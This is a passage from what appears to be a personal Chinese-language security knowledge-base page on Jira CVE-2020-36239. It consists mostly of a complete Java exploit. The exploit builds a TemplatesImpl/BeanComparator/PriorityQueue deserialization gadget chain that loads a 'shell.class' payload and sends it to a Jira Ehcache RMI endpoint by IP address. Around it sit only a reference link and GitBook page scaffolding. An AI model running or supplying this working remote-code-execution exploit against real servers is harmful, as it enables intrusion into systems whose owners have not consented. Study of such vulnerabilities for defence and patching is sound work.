+<pre class="language-"><code class="lang-java"><span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BeanComparator</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Field</span> f3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;property&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f3<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f3<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span><span class="token string">&quot;outputProperties&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Field</span> f4 <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;comparator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f4<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f4<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Field</span> f5 <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;queue&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+f5<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> queueArray <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> f5<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+queueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> templates<span class="token punctuation">;</span>
+</code></pre>
+<p>&#x5B8C;&#x6574;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
+<pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>myproject<span class="token punctuation">.</span>temp</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassClassPath</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>sf<span class="token punctuation">.</span>ehcache<span class="token punctuation">.</span>distribution<span class="token punctuation">.</span></span><span class="token class-name">RMICachePeer_Stub</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>wicket<span class="token punctuation">.</span>util<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span><span class="token class-name">GZIPOutputStream</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test_2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ctBytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">&quot;/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes/com/myproject/temp/shell.class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">CtClass</span> superC <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">CtClass</span> ctClass<span class="token punctuation">;</span>
+        ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;com.myproject.temp.ClassLoaderTemplate&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>ctClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ByteArrayOutputStream</span> outBuf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">GZIPOutputStream</span> gzipOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GZIPOutputStream</span><span class="token punctuation">(</span>outBuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        gzipOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>ctBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        gzipOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> content <span class="token operator">=</span> <span class="token string">&quot;b64=\&quot;&quot;</span> <span class="token operator">+</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>outBuf<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;\&quot;;&quot;</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> f <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;_name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">&quot;123&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Field</span> f1 <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;_bytecodes&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Field</span> f2 <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;_class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BeanComparator</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> f3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;property&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f3<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f3<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span><span class="token string">&quot;outputProperties&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> f4 <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;comparator&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f4<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f4<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> f5 <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;queue&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f5<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> queueArray <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> f5<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> templates<span class="token punctuation">;</span>
+
+        <span class="token class-name">Serializable</span> payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Serializable</span><span class="token punctuation">)</span> queue<span class="token punctuation">;</span>
+        <span class="token class-name">RMICachePeer_Stub</span> rmiCachePeer_stub <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMICachePeer_Stub</span><span class="token punctuation">)</span> <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        rmiCachePeer_stub<span class="token punctuation">.</span><span class="token function">getQuiet</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><a href="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_49_VJm3yPNd.png" data-lightbox="98b45f48-188a-4ba2-9fad-614b7d29cde2" data-title="image.png"><img src="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_49_VJm3yPNd.png" alt="image.png"></a></p>
+<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a name="&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. &#x53C2;&#x8003;&#x94FE;&#x63A5;</h2>
+<p><a href="https://forum.butian.net/share/653" target="_blank">https://forum.butian.net/share/653</a></p>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; aaron 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2023-05-19 16:08:50
+</span></footer>
+
+<pre class="language-"><code class="lang-html">Author: aaron
+Url: https://byaaronluo.github.io/&#x77E5;&#x8BC6;&#x5E93;/02.JAVA&#x5B89;&#x5168;/15.Jira_CVE2020-36239_RCE.html
+Source: aaron &#x77E5;&#x8BC6;&#x5E93;
+This article was originally published in&#x300C;aaron &#x77E5;&#x8BC6;&#x5E93;&#x300D;,Reproduced please indicate the source, thank you for cooperation!
+</code></pre>
+</body></html>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="14.Tomcat内存马无文件攻击.html" class="navigation navigation-prev " aria-label="Previous page: 14.Tomcat内存马无文件攻击">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="16.fastJson反序列化原理及利用.html" class="navigation navigation-next " aria-label="Next page: 16.fastJson反序列化原理及利用">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"15.Jira_CVE2020-36239_RCE","level":"1.3.15","depth":2,"next":{"title":"16.fastJson反序列化原理及利用","level":"1.3.16","depth":2,"path":"知识库/02.JAVA安全/16.fastJson反序列化原理及利用.md","ref":"知识库/02.JAVA安全/16.fastJson反序列化原理及利用.md","articles":[]},"previous":{"title":"14.Tomcat内存马无文件攻击","level":"1.3.14","depth":2,"path":"知识库/02.JAVA安全/14.Tomcat内存马无文件攻击.md","ref":"知识库/02.JAVA安全/14.Tomcat内存马无文件攻击.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","copyright","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy aaron 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; aaron","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash","xml-dtd":"xml"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack"]},"github":{"url":"https://github.com/byAaronLuo/"},"livereload":{},"splitter":{},"copyright":{"copyProtect":true,"site":"https://byaaronluo.github.io/","author":"aaron","website":"aaron 知识库","image":""},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/alipay.jpeg","alipayText":"支付宝打赏","button":"打赏☕️","title":"","wechat":"/README.assets/wx.jpeg","wechatText":"微信打赏"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 50px; min-height: 50px;border-radius:50%","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"aaron","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Aaron 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE.md","mtime":"2023-05-19T08:08:50.376Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-19T08:28:01.480Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-copyright/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
